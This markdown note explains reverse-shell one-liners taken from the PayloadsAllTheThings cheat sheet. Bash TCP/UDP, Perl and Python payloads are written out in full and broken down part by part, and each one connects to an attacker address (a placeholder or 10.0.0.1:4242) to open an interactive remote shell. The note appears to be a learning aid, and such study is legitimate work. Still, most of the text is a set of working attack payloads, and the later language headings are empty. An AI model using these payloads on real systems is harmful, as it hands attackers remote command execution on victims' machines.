# PayloadsAllTheThings Reverse shell analysis

[Reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Bash TCP**

**1.`bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1`**

`bash -i` start an interactive bash shell

`>& /dev/tcp/<ATTACKER-IP>/<PORT>` redirect stdout and stderr to a TCP socket connection 

`0>&1` or `0<&1` connect file descriptor 1 (stdout TCP socket connection) to file 
descriptor 0 (stdin)

We connect an interactive bash shell to the attackers machine through a TCP socket and 
execute commands by redirecting stdout from the TCP connection to stdin on the target 
machine.

**2. `0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196`**

`0<&196;` duplicate input file descriptor 196 to 0 (stdin)

`exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>;` redirect stdin and stdout of the tcp socket 
connection to file descriptor 196

`sh <&196 >&196 2>&196` execute stdin from file descriptor 196 with sh, redirect stdout
from sh to file descriptor 196, redirect stderr to file descriptor 196

**3. `/bin/bash -l > /dev/tcp/<ATTACKER-IP>/<PORT> 0<&1 2>&1`**

`/bin/bash -l` start bash as if a login shell were invoked

`> /dev/tcp/<ATTACKER-IP>/<PORT> ` redirect stdout to a TCP socket connection

`0<&1 2>&1` moves file descriptor 1 (stdout TCP connection) to file descriptor 0 (stdin) 
and redirects file descriptor 2 (stderr) to file descriptor 1 (stdout TCP connection)

**Bash UDP**

**`sh -i >& /dev/udp/<ATTACKER-IP>/<PORT> 0>&1`**

Same as Bash TCP 1 but with UDP

**Perl**

**1. `perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`**

`perl -e` execute the following perl command

`use Socket;` import Socket's functions

`$i=<ATTACKER-IP>;$p=<PORT>` define the variables i and p of our listening machine

`socket(S,PF_INET,SOCK_STREAM, getprotobyname("tcp");` call the socket function creating a 
TCP socket attaching it to filehandle S

```
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}
```

connect socket S to a listening machine on $i:$p, and if successful, redirect stdin from 
the connected socket and redirect stdout and stderr to the connected socket and finally 
execute a sh shell in interactive mode

**2. `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`**

**3. Windows only `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`**

**Python**

**IPv4**

**1. `export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`**

**2. `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`**

**3. `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`**

**IPv6**

**Windows only**

**PHP**

**Ruby**

**Golang**

**OpenSSL**

**Powershell**

**Awk**

**Java**

**Telnet**

**War**

**Lua**

**NodeJS**

**Groovy**

**C**

**Dart**